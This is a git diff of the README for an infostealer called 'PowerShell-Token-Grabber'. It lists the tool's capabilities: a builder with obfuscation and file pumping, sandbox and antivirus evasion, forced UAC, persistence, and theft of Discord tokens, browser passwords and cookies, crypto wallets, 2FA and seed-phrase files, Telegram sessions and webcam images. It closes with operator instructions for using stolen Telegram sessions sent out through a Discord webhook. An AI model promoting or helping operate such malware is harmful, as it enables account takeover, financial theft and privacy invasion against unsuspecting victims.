@@ -1,5 +1,5 @@
 <p align="center">
-<img src="https://i.postimg.cc/502twQyx/PTG.gif", width="300", height="300">
+<img src="https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/278e69c5-b54c-49a6-989a-e3596eb1ff63", width="300", height="300">
 </p>
 
 <h1 align="center">
@@ -37,22 +37,26 @@ Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). 
 Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat files 
 
 # Screenshots
-  ### Builder
-> ![GUI](https://i.postimg.cc/XYGShDPP/builder.png)
+  ## 🔨 Builder
+> ![GUI](https://i.postimg.cc/HLt16rSp/builder.png)
+   ### Builder Features
+ - [x] 🔸 Obfuscation of ```BAT``` and ```PS1``` files
+ - [x] 💉 Pump/Inject the output exe file with zero-filled bytes 
 
- ### Webhook Data
-> ![screenshot](https://i.imgur.com/CQ8zzqg.png)
+
+ ## 🔷 Webhook Data
+> ![screenshot](https://user-images.githubusercontent.com/96607632/236490140-201f4987-3569-4542-a769-41cf09574f2d.png)
 > ![data](https://github.com/Chainski/PowerShell-Token-Grabber/assets/96607632/8a15c7d4-8d70-4d17-81c2-f9f602ccd81a)
 
 #  Features
 - [x] GUI Builder
-- [x] File Pumper
 - [x] [Mutex](https://learn.microsoft.com/en-us/dotnet/api/system.threading.mutex?view=net-7.0) (single instance)
 - [x] Force [UAC](https://learn.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)
 - [x] Anti-Analysis ```VMWare, VirtualBox, Sandboxes, Emulators, Debuggers, Virustotal, Any.run```
 - [x] Persistence via [Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler) 
 - [x] Extracts WiFi Passwords
-- [x] File grabber ```2fa, backupcodes, seedphrases, passwords, etc.``` 
+- [x] Files ```2fa, backupcodes, seedphrases, passwords, etc.``` 
+- [x] 📷 Webcam & Desktop Screenshots
 - [x] Session Stealers
   - [Telegram](https://telegram.org) 
   - [Element](https://element.io) 
@@ -61,12 +65,14 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
   - [Minecraft](https://minecraft.net)
 - [x] Crypto Wallets 
    > Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Guarda | Jaxx | Litecoin | Monero | Zcash
-- [x] Extracts Browser Data (Brave, Chrome, Firefox, Microsoft Edge, Thunderbird etc.)
+- [x] Browsers (Brave, Chrome, Firefox, Microsoft Edge, Thunderbird etc.)
+  - 🔑 Passwords
+  - 🍪 Cookies
+  - 📜 History
 - [x] Extracts [Discord](https://discord.com) Token
 - [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
-- [x] Takes Desktop Screenshot  
 - [x] Get System Uptime 
-- [x] Get Screen Resolution
+- [X] Get Screen Resolution
 - [x] List of Installed Applications
 - [x] List of Installed Antiviruses
 - [x] List of all Network Adapters
@@ -75,7 +81,6 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] List TCP Connections and Underlying Process
 - [x] Extracts Product Key
 - [x] Self-Destructs After Execution (optional)
-- [x] Webcam Image Grabber
 
 ### Telegram Session Stealer Usage :
 After the exfiltrated data is uploaded to your discord webhook, download the compressed file ```KDOT.zip```, inside that folder there will also be another zipped folder ```telegram-session.zip``` extract it on your PC.
